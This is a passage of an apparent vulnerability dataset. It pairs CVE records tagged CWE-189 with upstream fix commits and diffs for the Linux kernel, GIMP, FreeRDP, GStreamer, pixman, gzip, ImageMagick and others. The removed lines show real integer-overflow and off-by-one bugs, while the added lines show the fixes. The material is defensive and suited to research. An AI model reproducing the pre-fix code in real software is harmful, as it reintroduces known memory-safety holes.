9 +++++++++\n 1 file changed, 9 insertions(+)\n\n","diff_code":"diff --git a\/fs\/udf\/inode.c b\/fs\/udf\/inode.c\nindex 95cb6970c3ea..7b72b7dd8906 100644\n--- a\/fs\/udf\/inode.c\n+++ b\/fs\/udf\/inode.c\n@@ -1487,6 +1487,15 @@ reread:\n \t}\n \tinode->i_generation = iinfo->i_unique;\n \n+\t\/*\n+\t * Sanity check length of allocation descriptors and extended attrs to\n+\t * avoid integer overflows\n+\t *\/\n+\tif (iinfo->i_lenEAttr > bs || iinfo->i_lenAlloc > bs)\n+\t\tgoto out;\n+\t\/* Now do exact checks *\/\n+\tif (udf_file_entry_alloc_offset(inode) + iinfo->i_lenAlloc > bs)\n+\t\tgoto out;\n \t\/* Sanity checks for files in ICB so that we don't get confused later *\/\n \tif (iinfo->i_alloc_type == ICBTAG_FLAG_AD_IN_ICB) {\n \t\t\/*\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2014-2889","CWE_ID":"189","category":"security","commit_id":"a03ffcf873fe0f2565386ca8ef832144c42e67fa","commit_message":"From a03ffcf873fe0f2565386ca8ef832144c42e67fa Mon Sep 17 00:00:00 2001\nFrom: =?UTF-8?q?Markus=20K=C3=B6tter?= <nepenthesdev@gmail.com>\nDate: Sat, 17 Dec 2011 11:39:08 +0000\nSubject: [PATCH] net: bpf_jit: fix an off-one bug in x86_64 cond jump target\nMIME-Version: 1.0\nContent-Type: text\/plain; charset=UTF-8\nContent-Transfer-Encoding: 8bit\n\nx86 jump instruction size is 2 or 5 bytes (near\/long jump), not 2 or 6\nbytes.\n\nIn case a conditional jump is followed by a long jump, conditional jump\ntarget is one byte past the start of target instruction.\n\nSigned-off-by: Markus K\u00f6tter <nepenthesdev@gmail.com>\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n arch\/x86\/net\/bpf_jit_comp.c | 4 ++--\n 1 file changed, 2 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/arch\/x86\/net\/bpf_jit_comp.c b\/arch\/x86\/net\/bpf_jit_comp.c\nindex bfab3fa10edc6..7b65f752c5f8f 100644\n--- a\/arch\/x86\/net\/bpf_jit_comp.c\n+++ b\/arch\/x86\/net\/bpf_jit_comp.c\n@@ -568,8 +568,8 @@ cond_branch:\t\t\tf_offset = addrs[i + filter[i].jf] - addrs[i];\n \t\t\t\t\tbreak;\n \t\t\t\t}\n \t\t\t\tif (filter[i].jt != 0) {\n-\t\t\t\t\tif (filter[i].jf)\n-\t\t\t\t\t\tt_offset += is_near(f_offset) ? 2 : 6;\n+\t\t\t\t\tif (filter[i].jf && f_offset)\n+\t\t\t\t\t\tt_offset += is_near(f_offset) ? 2 : 5;\n \t\t\t\t\tEMIT_COND_JMP(t_op, t_offset);\n \t\t\t\t\tif (filter[i].jf)\n \t\t\t\t\t\tEMIT_JMP(f_offset);\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2014-8369","CWE_ID":"189","category":"security","commit_id":"3d32e4dbe71374a6780eaf51d719d76f9a9bf22f","commit_message":"From 3d32e4dbe71374a6780eaf51d719d76f9a9bf22f Mon Sep 17 00:00:00 2001\nFrom: Quentin Casasnovas <quentin.casasnovas@oracle.com>\nDate: Fri, 17 Oct 2014 22:55:59 +0200\nSubject: [PATCH] kvm: fix excessive pages un-pinning in kvm_iommu_map error\n path.\n\nThe third parameter of kvm_unpin_pages() when called from\nkvm_iommu_map_pages() is wrong, it should be the number of pages to un-pin\nand not the page size.\n\nThis error was facilitated with an inconsistent API: kvm_pin_pages() takes\na size, but kvn_unpin_pages() takes a number of pages, so fix the problem\nby matching the two.\n\nThis was introduced by commit 350b8bd (\"kvm: iommu: fix the third parameter\nof kvm_iommu_put_pages (CVE-2014-3601)\"), which fixes the lack of\nun-pinning for pages intended to be un-pinned (i.e. memory leak) but\nunfortunately potentially aggravated the number of pages we un-pin that\nshould have stayed pinned. As far as I understand though, the same\npractical mitigations apply.\n\nThis issue was found during review of Red Hat 6.6 patches to prepare\nKsplice rebootless updates.\n\nThanks to Vegard for his time on a late Friday evening to help me in\nunderstanding this code.\n\nFixes: 350b8bd (\"kvm: iommu: fix the third parameter of... (CVE-2014-3601)\")\nCc: stable@vger.kernel.org\nSigned-off-by: Quentin Casasnovas <quentin.casasnovas@oracle.com>\nSigned-off-by: Vegard Nossum <vegard.nossum@oracle.com>\nSigned-off-by: Jamie Iles <jamie.iles@oracle.com>\nReviewed-by: Sasha Levin <sasha.levin@oracle.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>\n---\n virt\/kvm\/iommu.c | 8 ++++----\n 1 file changed, 4 insertions(+), 4 deletions(-)\n\n","diff_code":"diff --git a\/virt\/kvm\/iommu.c b\/virt\/kvm\/iommu.c\nindex e51d9f9b995f1..c1e6ae989a432 100644\n--- a\/virt\/kvm\/iommu.c\n+++ b\/virt\/kvm\/iommu.c\n@@ -43,13 +43,13 @@ static void kvm_iommu_put_pages(struct kvm *kvm,\n \t\t\t\tgfn_t base_gfn, unsigned long npages);\n \n static pfn_t kvm_pin_pages(struct kvm_memory_slot *slot, gfn_t gfn,\n-\t\t\t   unsigned long size)\n+\t\t\t   unsigned long npages)\n {\n \tgfn_t end_gfn;\n \tpfn_t pfn;\n \n \tpfn     = gfn_to_pfn_memslot(slot, gfn);\n-\tend_gfn = gfn + (size >> PAGE_SHIFT);\n+\tend_gfn = gfn + npages;\n \tgfn    += 1;\n \n \tif (is_error_noslot_pfn(pfn))\n@@ -119,7 +119,7 @@ int kvm_iommu_map_pages(struct kvm *kvm, struct kvm_memory_slot *slot)\n \t\t * Pin all pages we are about to map in memory. This is\n \t\t * important because we unmap and unpin in 4kb steps later.\n \t\t *\/\n-\t\tpfn = kvm_pin_pages(slot, gfn, page_size);\n+\t\tpfn = kvm_pin_pages(slot, gfn, page_size >> PAGE_SHIFT);\n \t\tif (is_error_noslot_pfn(pfn)) {\n \t\t\tgfn += 1;\n \t\t\tcontinue;\n@@ -131,7 +131,7 @@ int kvm_iommu_map_pages(struct kvm *kvm, struct kvm_memory_slot *slot)\n \t\tif (r) {\n \t\t\tprintk(KERN_ERR \"kvm_iommu_map_address:\"\n \t\t\t       \"iommu failed to map pfn=%llx\\n\", pfn);\n-\t\t\tkvm_unpin_pages(kvm, pfn, page_size);\n+\t\t\tkvm_unpin_pages(kvm, pfn, page_size >> PAGE_SHIFT);\n \t\t\tgoto unmap_pages;\n \t\t}\n \n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2013-3671","CWE_ID":"189","category":"security","commit_id":"7edb984dd051b6919d7d8471c70499273f31b0fa","commit_message":"From 7edb984dd051b6919d7d8471c70499273f31b0fa Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michaelni@gmx.at>\nDate: Tue, 30 Apr 2013 20:05:31 +0200\nSubject: [PATCH] avutil\/log: Fix context pointer used for get_category()\n\nFixes calling a random pointer\n\nFound-by: Mateusz \"j00ru\" Jurczyk and Gynvael Coldwind\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n---\n libavutil\/log.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/libavutil\/log.c b\/libavutil\/log.c\nindex f29345b97a..15ff5f86bc 100644\n--- a\/libavutil\/log.c\n+++ b\/libavutil\/log.c\n@@ -180,7 +180,7 @@ static void format_line(void *ptr, int level, const char *fmt, va_list vl,\n             if (parent && *parent) {\n                 snprintf(part[0], part_size, \"[%s @ %p] \",\n                          (*parent)->item_name(parent), parent);\n-                if(type) type[0] = get_category(((uint8_t *) ptr) + avc->parent_log_context_offset);\n+                if(type) type[0] = get_category(parent);\n             }\n         }\n         snprintf(part[1], part_size, \"[%s @ %p] \",\n-- \n2.11.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2009-3909","CWE_ID":"189","category":"security","commit_id":"9cc8d78ff33b7a36852b74e64b427489cad44d0e","commit_message":"From 9cc8d78ff33b7a36852b74e64b427489cad44d0e Mon Sep 17 00:00:00 2001\nFrom: Simon Budig <simon@gimp.org>\nDate: Tue, 17 Nov 2009 00:41:39 +0100\nSubject: [PATCH] Harden the PSD plugin against integer overflows.\n\nIssues discovered by Stefan Cornelius, Secunia Research, advisory SA37232\nand CVE identifier CVE-2009-3909. Fixes bug #600741.\n---\n plug-ins\/file-psd\/psd-load.c | 65 ++++++++++++++++++++++++++++++++++--\n 1 file changed, 62 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/plug-ins\/file-psd\/psd-load.c b\/plug-ins\/file-psd\/psd-load.c\nindex 63f8f01f95..eeafc360c6 100644\n--- a\/plug-ins\/file-psd\/psd-load.c\n+++ b\/plug-ins\/file-psd\/psd-load.c\n@@ -303,6 +303,15 @@ read_header_block (PSDimage  *img_a,\n       return -1;\n     }\n \n+  \/* img_a->rows is sanitized above, so a division by zero is avoided here *\/\n+  if (img_a->columns > G_MAXINT32 \/ img_a->rows)\n+    {\n+      g_set_error (error, G_FILE_ERROR, G_FILE_ERROR_FAILED,\n+                   _(\"Unsupported or invalid image size: %dx%d\"),\n+                   img_a->columns, img_a->rows);\n+      return -1;\n+    }\n+\n   if (img_a->color_mode != PSD_BITMAP\n       && img_a->color_mode != PSD_GRAYSCALE\n       && img_a->color_mode != PSD_INDEXED\n@@ -545,14 +554,16 @@ read_layer_block (PSDimage  *img_a,\n                               lyr_a[lidx]->num_channels);\n                   return NULL;\n                 }\n-              if (lyr_a[lidx]->bottom - lyr_a[lidx]->top > GIMP_MAX_IMAGE_SIZE)\n+              if (lyr_a[lidx]->bottom < lyr_a[lidx]->top ||\n+                  lyr_a[lidx]->bottom - lyr_a[lidx]->top > GIMP_MAX_IMAGE_SIZE)\n                 {\n                   g_set_error (error, G_FILE_ERROR, G_FILE_ERROR_FAILED,\n                               _(\"Unsupported or invalid layer height: %d\"),\n                               lyr_a[lidx]->bottom - lyr_a[lidx]->top);\n                   return NULL;\n                 }\n-              if (lyr_a[lidx]->right - lyr_a[lidx]->left > GIMP_MAX_IMAGE_SIZE)\n+              if (lyr_a[lidx]->right < lyr_a[lidx]->left ||\n+                  lyr_a[lidx]->right - lyr_a[lidx]->left > GIMP_MAX_IMAGE_SIZE)\n                 {\n                   g_set_error (error, G_FILE_ERROR, G_FILE_ERROR_FAILED,\n                               _(\"Unsupported or invalid layer width: %d\"),\n@@ -560,6 +571,16 @@ read_layer_block (PSDimage  *img_a,\n                   return NULL;\n                 }\n \n+              if ((lyr_a[lidx]->right - lyr_a[lidx]->left) >\n+                  G_MAXINT32 \/ MAX (lyr_a[lidx]->bottom - lyr_a[lidx]->top, 1))\n+                {\n+                  g_set_error (error, G_FILE_ERROR, G_FILE_ERROR_FAILED,\n+                               _(\"Unsupported or invalid layer size: %dx%d\"),\n+                               lyr_a[lidx]->right - lyr_a[lidx]->left,\n+                               lyr_a[lidx]->bottom - lyr_a[lidx]->top);\n+                  return NULL;\n+                }\n+\n               IFDBG(2) g_debug (\"Layer %d, Coords %d %d %d %d, channels %d, \",\n                                  lidx, lyr_a[lidx]->left, lyr_a[lidx]->top,\n                                  lyr_a[lidx]->right, lyr_a[lidx]->bottom,\n@@ -733,6 +754,34 @@ read_layer_block (PSDimage  *img_a,\n                       }\n                 }\n \n+              \/* sanity checks *\/\n+              if (lyr_a[lidx]->layer_mask.bottom < lyr_a[lidx]->layer_mask.top ||\n+                  lyr_a[lidx]->layer_mask.bottom - lyr_a[lidx]->layer_mask.top > GIMP_MAX_IMAGE_SIZE)\n+                {\n+                  g_set_error (error, G_FILE_ERROR, G_FILE_ERROR_FAILED,\n+                               _(\"Unsupported or invalid layer mask height: %d\"),\n+                               lyr_a[lidx]->layer_mask.bottom - lyr_a[lidx]->layer_mask.top);\n+                  return NULL;\n+                }\n+              if (lyr_a[lidx]->layer_mask.right < lyr_a[lidx]->layer_mask.left ||\n+                  lyr_a[lidx]->layer_mask.right - lyr_a[lidx]->layer_mask.left > GIMP_MAX_IMAGE_SIZE)\n+                {\n+                  g_set_error (error, G_FILE_ERROR, G_FILE_ERROR_FAILED,\n+                               _(\"Unsupported or invalid layer mask width: %d\"),\n+                               lyr_a[lidx]->layer_mask.right - lyr_a[lidx]->layer_mask.left);\n+                  return NULL;\n+                }\n+\n+              if ((lyr_a[lidx]->layer_mask.right - lyr_a[lidx]->layer_mask.left) >\n+                  G_MAXINT32 \/ MAX (lyr_a[lidx]->layer_mask.bottom - lyr_a[lidx]->layer_mask.top, 1))\n+                {\n+                  g_set_error (error, G_FILE_ERROR, G_FILE_ERROR_FAILED,\n+                               _(\"Unsupported or invalid layer mask size: %dx%d\"),\n+                               lyr_a[lidx]->layer_mask.right - lyr_a[lidx]->layer_mask.left,\n+                               lyr_a[lidx]->layer_mask.bottom - lyr_a[lidx]->layer_mask.top);\n+                  return NULL;\n+                }\n+\n               IFDBG(2) g_debug (\"Layer mask coords %d %d %d %d, Rel pos %d\",\n                                 lyr_a[lidx]->layer_mask.left,\n                                 lyr_a[lidx]->layer_mask.top,\n@@ -1134,7 +1183,7 @@ add_layers (const gint32  image_id,\n                                 psd_set_error (feof (f), errno, error);\n                                 return -1;\n                               }\n-                                rle_pack_len[rowi] = GUINT16_FROM_BE (rle_pack_len[rowi]);\n+                            rle_pack_len[rowi] = GUINT16_FROM_BE (rle_pack_len[rowi]);\n                           }\n \n                         IFDBG(3) g_debug (\"RLE decode - data\");\n@@ -1760,6 +1809,16 @@ read_channel_data (PSDchannel     *channel,\n \n   IFDBG(3) g_debug (\"raw data size %d x %d = %d\", readline_len,\n                     channel->rows, readline_len * channel->rows);\n+\n+  \/* sanity check, int overflow check (avoid divisions by zero) *\/\n+  if ((channel->rows == 0) || (channel->columns == 0) ||\n+      (channel->rows > G_MAXINT32 \/ channel->columns \/ MAX (bps >> 3, 1)))\n+    {\n+      g_set_error (error, G_FILE_ERROR, G_FILE_ERROR_FAILED,\n+                   _(\"Unsupported or invalid channel size\"));\n+      return -1;\n+    }\n+\n   raw_data = g_malloc (readline_len * channel->rows);\n   switch (compression)\n     {\n-- \n2.21.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2014-0791","CWE_ID":"189","category":"security","commit_id":"e2745807c4c3e0a590c0f69a9b655dc74ebaa03e","commit_message":"From e2745807c4c3e0a590c0f69a9b655dc74ebaa03e Mon Sep 17 00:00:00 2001\nFrom: Huzaifa Sidhpurwala <huzaifas@redhat.com>\nDate: Thu, 2 Jan 2014 14:34:03 +0530\nSubject: [PATCH] Fix possible integer overflow in license_read_scope_list()\n\n---\n libfreerdp\/core\/license.c | 3 +++\n 1 file changed, 3 insertions(+)\n\n","diff_code":"diff --git a\/libfreerdp\/core\/license.c b\/libfreerdp\/core\/license.c\nindex e26e5e0fdb..d5b5d33ab2 100644\n--- a\/libfreerdp\/core\/license.c\n+++ b\/libfreerdp\/core\/license.c\n@@ -670,6 +670,9 @@ BOOL license_read_scope_list(wStream* s, SCOPE_LIST* scopeList)\n \n \tStream_Read_UINT32(s, scopeCount); \/* ScopeCount (4 bytes) *\/\n \n+        if (Stream_GetRemainingLength(s) \/ sizeof(LICENSE_BLOB) < scopeCount)\n+                return FALSE;  \/* Avoid overflow in malloc *\/\n+\n \tscopeList->count = scopeCount;\n \tscopeList->array = (LICENSE_BLOB*) malloc(sizeof(LICENSE_BLOB) * scopeCount);\n \n","owner":"sidhpurwala-huzaifa","repo":"FreeRDP","source":"cve"},{"CVE_ID":"CVE-2009-1932","CWE_ID":"189","category":"security","commit_id":"d9544bcc44adcef769cbdf7f6453e140058a3adc","commit_message":"From d9544bcc44adcef769cbdf7f6453e140058a3adc Mon Sep 17 00:00:00 2001\nFrom: Jan Schmidt <thaytan@noraisin.net>\nDate: Wed, 27 May 2009 17:06:34 +0100\nSubject: pngdec: Avoid possible overflow in calculations\n\nA malformed (or simply huge) PNG file can lead to integer overflow in\ncalculating the size of the output buffer, leading to crashes or buffer\noverflows later. Fixes SA35205 security advisory.\n---\n ext\/libpng\/gstpngdec.c | 20 ++++++++++++++++----\n 1 file changed, 16 insertions(+), 4 deletions(-)\n\n","diff_code":"diff --git a\/ext\/libpng\/gstpngdec.c b\/ext\/libpng\/gstpngdec.c\nindex 524b468..dde459d 100644\n--- a\/ext\/libpng\/gstpngdec.c\n+++ b\/ext\/libpng\/gstpngdec.c\n@@ -201,7 +201,14 @@ user_info_callback (png_structp png_ptr, png_infop info)\n \n   \/* Allocate output buffer *\/\n   pngdec->rowbytes = png_get_rowbytes (pngdec->png, pngdec->info);\n-  buffer_size = pngdec->height * GST_ROUND_UP_4 (pngdec->rowbytes);\n+  if (pngdec->rowbytes > (G_MAXUINT32 - 3)\n+      || pngdec->height > G_MAXUINT32 \/ pngdec->rowbytes) {\n+    ret = GST_FLOW_ERROR;\n+    goto beach;\n+  }\n+  pngdec->rowbytes = GST_ROUND_UP_4 (pngdec->rowbytes);\n+  buffer_size = pngdec->height * pngdec->rowbytes;\n+\n   ret =\n       gst_pad_alloc_buffer_and_set_caps (pngdec->srcpad, GST_BUFFER_OFFSET_NONE,\n       buffer_size, GST_PAD_CAPS (pngdec->srcpad), &buffer);\n@@ -228,7 +235,7 @@ user_endrow_callback (png_structp png_ptr, png_bytep new_row,\n   \/* If buffer_out doesn't exist, it means buffer_alloc failed, which \n    * will already have set the return code *\/\n   if (GST_IS_BUFFER (pngdec->buffer_out)) {\n-    size_t offset = row_num * GST_ROUND_UP_4 (pngdec->rowbytes);\n+    size_t offset = row_num * pngdec->rowbytes;\n \n     GST_LOG (\"got row %u, copying in buffer %p at offset %\" G_GSIZE_FORMAT,\n         (guint) row_num, pngdec->buffer_out, offset);\n@@ -496,7 +503,12 @@ gst_pngdec_task (GstPad * pad)\n \n   \/* Allocate output buffer *\/\n   rowbytes = png_get_rowbytes (pngdec->png, pngdec->info);\n-  buffer_size = pngdec->height * GST_ROUND_UP_4 (rowbytes);\n+  if (rowbytes > (G_MAXUINT32 - 3) || pngdec->height > G_MAXUINT32 \/ rowbytes) {\n+    ret = GST_FLOW_ERROR;\n+    goto pause;\n+  }\n+  rowbytes = GST_ROUND_UP_4 (rowbytes);\n+  buffer_size = pngdec->height * rowbytes;\n   ret =\n       gst_pad_alloc_buffer_and_set_caps (pngdec->srcpad, GST_BUFFER_OFFSET_NONE,\n       buffer_size, GST_PAD_CAPS (pngdec->srcpad), &buffer);\n@@ -509,7 +521,7 @@ gst_pngdec_task (GstPad * pad)\n \n   for (i = 0; i < pngdec->height; i++) {\n     rows[i] = inp;\n-    inp += GST_ROUND_UP_4 (rowbytes);\n+    inp += rowbytes;\n   }\n \n   \/* Read the actual picture *\/\n-- \ncgit v1.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2013-6425","CWE_ID":"189","category":"security","commit_id":"5e14da97f16e421d084a9e735be21b1025150f0c","commit_message":"From 5e14da97f16e421d084a9e735be21b1025150f0c Mon Sep 17 00:00:00 2001\nFrom: Ritesh Khadgaray <khadgaray@gmail.com>\nDate: Wed, 23 Oct 2013 17:29:07 -0400\nSubject: pixman_trapezoid_valid(): Fix underflow when bottom is close to\n MIN_INT\n\nIf t->bottom is close to MIN_INT (probably invalid value), subtracting\ntop can lead to underflow which causes crashes.  Attached patch will\nfix the issue.\n\nThis fixes bug 67484.\n---\n pixman\/pixman.h | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/pixman\/pixman.h b\/pixman\/pixman.h\nindex 7ff9fb5..509ba5e 100644\n--- a\/pixman\/pixman.h\n+++ b\/pixman\/pixman.h\n@@ -1030,7 +1030,7 @@ struct pixman_triangle\n #define pixman_trapezoid_valid(t)\t\t\t\t   \\\n     ((t)->left.p1.y != (t)->left.p2.y &&\t\t\t   \\\n      (t)->right.p1.y != (t)->right.p2.y &&\t\t\t   \\\n-     (int) ((t)->bottom - (t)->top) > 0)\n+     ((t)->bottom > (t)->top))\n \n struct pixman_span_fix\n {\n-- \ncgit v1.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2015-8872","CWE_ID":"189","category":"security","commit_id":"07908124838afcc99c577d1d3e84cef2dbd39cb7","commit_message":"From 07908124838afcc99c577d1d3e84cef2dbd39cb7 Mon Sep 17 00:00:00 2001\nFrom: Andreas Bombe <aeb@debian.org>\nDate: Fri, 11 Sep 2015 19:47:29 +0200\nSubject: [PATCH] set_fat(): Fix off-by-2 error leading to corruption in FAT12\nMIME-Version: 1.0\nContent-Type: text\/plain; charset=UTF-8\nContent-Transfer-Encoding: 8bit\n\nIn FAT12 two 12 bit entries are combined to a 24 bit value (three\nbytes). Therefore, when an even numbered FAT entry is set in FAT12, it\nmust be be combined with the following entry. To prevent accessing\nbeyond the end of the FAT array, it must be checked that the cluster is\nnot the last one.\n\nPreviously, the check tested that the requested cluster was equal to\nfs->clusters - 1. However, fs->clusters is the number of data clusters\nnot including the two reserved FAT entries at the start so the test\ntriggered two clusters early.\n\nIf the third to last entry was written on a FAT12 filesystem with an\nodd number of clusters, the second to last entry would be corrupted.\nThis corruption may also lead to invalid memory accesses when the\ncorrupted entry becomes out of bounds and is used later.\n\nChange the test to fs->clusters + 1 to fix.\n\nReported-by: Hanno B\u00f6ck\nSigned-off-by: Andreas Bombe <aeb@debian.org>\n---\n src\/fat.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/src\/fat.c b\/src\/fat.c\nindex 0c19184..845b748 100644\n--- a\/src\/fat.c\n+++ b\/src\/fat.c\n@@ -205,7 +205,7 @@ void set_fat(DOS_FS * fs, uint32_t cluster, int32_t new)\n \t    data[1] = new >> 4;\n \t} else {\n \t    FAT_ENTRY subseqEntry;\n-\t    if (cluster != fs->clusters - 1)\n+\t    if (cluster != fs->clusters + 1)\n \t\tget_fat(&subseqEntry, fs->fat, cluster + 1, fs);\n \t    else\n \t\tsubseqEntry.value = 0;\n","owner":"dosfstools","repo":"dosfstools","source":"cve"},{"CVE_ID":"CVE-2014-2309","CWE_ID":"189","category":"security","commit_id":"c88507fbad8055297c1d1e21e599f46960cbee39","commit_message":"From c88507fbad8055297c1d1e21e599f46960cbee39 Mon Sep 17 00:00:00 2001\nFrom: Sabrina Dubroca <sd@queasysnail.net>\nDate: Thu, 6 Mar 2014 17:51:57 +0100\nSubject: ipv6: don't set DST_NOCOUNT for remotely added routes\n\nDST_NOCOUNT should only be used if an authorized user adds routes\nlocally. In case of routes which are added on behalf of router\nadvertisments this flag must not get used as it allows an unlimited\nnumber of routes getting added remotely.\n\nSigned-off-by: Sabrina Dubroca <sd@queasysnail.net>\nAcked-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net\/ipv6\/route.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/net\/ipv6\/route.c b\/net\/ipv6\/route.c\nindex 11dac21e6586..fba54a407bb2 100644\n--- a\/net\/ipv6\/route.c\n+++ b\/net\/ipv6\/route.c\n@@ -1513,7 +1513,7 @@ int ip6_route_add(struct fib6_config *cfg)\n \tif (!table)\n \t\tgoto out;\n \n-\trt = ip6_dst_alloc(net, NULL, DST_NOCOUNT, table);\n+\trt = ip6_dst_alloc(net, NULL, (cfg->fc_flags & RTF_ADDRCONF) ? 0 : DST_NOCOUNT, table);\n \n \tif (!rt) {\n \t\terr = -ENOMEM;\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2009-1194","CWE_ID":"189","category":"security","commit_id":"4de30e5500eaeb49f4bf0b7a07f718e149a2ed5e","commit_message":"From 4de30e5500eaeb49f4bf0b7a07f718e149a2ed5e Mon Sep 17 00:00:00 2001\nFrom: Behdad Esfahbod <behdad@behdad.org>\nDate: Mon, 2 Mar 2009 12:00:52 +0330\nSubject: [PATCH] [glyphstring] Handle overflow with very long glyphstrings\n\n---\n pango\/glyphstring.c | 26 ++++++++++++++++++++------\n 1 file changed, 20 insertions(+), 6 deletions(-)\n\n","diff_code":"diff --git a\/pango\/glyphstring.c b\/pango\/glyphstring.c\nindex 42601d52..8fb70313 100644\n--- a\/pango\/glyphstring.c\n+++ b\/pango\/glyphstring.c\n@@ -61,14 +61,28 @@ pango_glyph_string_set_size (PangoGlyphString *string, gint new_len)\n   while (new_len > string->space)\n     {\n       if (string->space == 0)\n-\tstring->space = 1;\n+\t{\n+\t  string->space = 4;\n+\t}\n       else\n-\tstring->space *= 2;\n-\n-      if (string->space < 0)\n \t{\n-\t  g_warning (\"glyph string length overflows maximum integer size, truncated\");\n-\t  new_len = string->space = G_MAXINT - 8;\n+\t  const guint max_space =\n+\t    MIN (G_MAXINT, G_MAXSIZE \/ MAX (sizeof(PangoGlyphInfo), sizeof(gint)));\n+\n+\t  guint more_space = (guint)string->space * 2;\n+\n+\t  if (more_space > max_space)\n+\t    {\n+\t      more_space = max_space;\n+\n+\t      if ((guint)new_len > max_space)\n+\t\t{\n+\t\t  g_error (\"%s: failed to allocate glyph string of length %i\\n\",\n+\t\t\t   G_STRLOC, new_len);\n+\t\t}\n+\t    }\n+\n+\t  string->space = more_space;\n \t}\n     }\n \n","owner":"bratsche","repo":"pango","source":"cve"},{"CVE_ID":"CVE-2016-10145","CWE_ID":"189","category":"security","commit_id":"d23beebe7b1179fb75db1e85fbca3100e49593d9","commit_message":"From d23beebe7b1179fb75db1e85fbca3100e49593d9 Mon Sep 17 00:00:00 2001\nFrom: Cristy <urban-warrior@imagemagick.org>\nDate: Sat, 24 Dec 2016 11:44:42 -0500\nSubject: [PATCH] ...\n\n---\n coders\/wpg.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/coders\/wpg.c b\/coders\/wpg.c\nindex 7cd9162931..82c3b7e29e 100644\n--- a\/coders\/wpg.c\n+++ b\/coders\/wpg.c\n@@ -803,7 +803,7 @@ static Image *ExtractPostscript(Image *image,const ImageInfo *image_info,\n   if(exception->severity != UndefinedException) goto FINISH_UNL;\n   if(magic_info->name == (char *) NULL) goto FINISH_UNL;\n \n-  (void) strncpy(clone_info->magick,magic_info->name,MaxTextExtent);\n+  (void) strncpy(clone_info->magick,magic_info->name,MaxTextExtent-1);\n \n     \/* Read nested image *\/\n   \/*FormatString(clone_info->filename,\"%s:%s\",magic_info->name,postscript_file);*\/\n","owner":"ImageMagick","repo":"ImageMagick","source":"cve"},{"CVE_ID":"CVE-2010-0001","CWE_ID":"189","category":"security","commit_id":"a3db5806d012082b9e25cc36d09f19cd736a468f","commit_message":"From a3db5806d012082b9e25cc36d09f19cd736a468f Mon Sep 17 00:00:00 2001\nFrom: Jim Meyering <meyering@redhat.com>\nDate: Sun, 10 Jan 2010 17:13:01 +0100\nSubject: gzip -d: do not clobber stack for valid input on x86_64\n\n* unlzw.c (unlzw): Avoid integer overflow.\nAki Helin reported the segfault along with an input to trigger the bug.\n* NEWS (Bug fixes): Mention it.\n---\n NEWS    | 5 +++++\n THANKS  | 1 +\n unlzw.c | 3 ++-\n 3 files changed, 8 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/NEWS b\/NEWS\nindex 3e50762..747253f 100644\n--- a\/NEWS\n+++ b\/NEWS\n@@ -4,6 +4,11 @@ GNU gzip NEWS                                    -*- outline -*-\n \n ** Bug fixes\n \n+  gzip -d could segfault and\/or clobber the stack, possibly leading to\n+  arbitrary code execution.  This affects x86_64 but not 32-bit systems.\n+  This fixes CVE-2010-0001.\n+  For more details, see http:\/\/bugzilla.redhat.com\/554418\n+\n   gzip -d would fail with a CRC error for some valid inputs.\n   So far, the only valid input known to exhibit this failure was\n   compressed \"from FAT filesystem (MS-DOS, OS\/2, NT)\".  In addition,\ndiff --git a\/THANKS b\/THANKS\nindex 4725543..183d39c 100644\n--- a\/THANKS\n+++ b\/THANKS\n@@ -97,6 +97,7 @@ Harald Hanche-Olsen     hanche@ams.sunysb.edu\n Darrel R. Hankerson     hankedr@mail.auburn.edu\n Mark Hanning-Lee        markhl@romeo.caltech.edu\n Lars Hecking            st000002@hrz1.hrz.th-darmstadt.de\n+Aki Helin               aki.helin@iki.fi\n Ruediger Helsch         ruediger@ramz.ing.tu-bs.de\n Mark C. Henderson       mch@sqwest.wimsey.bc.ca\n Karl Heuer              karl@kelp.boston.ma.us\ndiff --git a\/unlzw.c b\/unlzw.c\nindex fb9ff76..8f8cbee 100644\n--- a\/unlzw.c\n+++ b\/unlzw.c\n@@ -240,7 +240,8 @@ int unlzw(in, out)\n \tint  o;\n \n     resetbuf:\n-\te = insize-(o = (posbits>>3));\n+\to = posbits >> 3;\n+\te = o <= insize ? insize - o : 0;\n \n \tfor (i = 0 ; i < e ; ++i) {\n \t    inbuf[i] = inbuf[i+o];\n-- \ncgit v1.0-41-gc330\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2012-2386","CWE_ID":"189","category":"security","commit_id":"158d8a6b088662ce9d31e0c777c6ebe90efdc854","commit_message":"From 158d8a6b088662ce9d31e0c777c6ebe90efdc854 Mon Sep 17 00:00:00 2001\nFrom: Stanislav Malyshev <stas@php.net>\nDate: Mon, 28 May 2012 18:54:15 -0700\nSubject: [PATCH] fix unchecked emalloc\n\n---\n ext\/phar\/tar.c | 6 +++---\n 1 file changed, 3 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/ext\/phar\/tar.c b\/ext\/phar\/tar.c\nindex 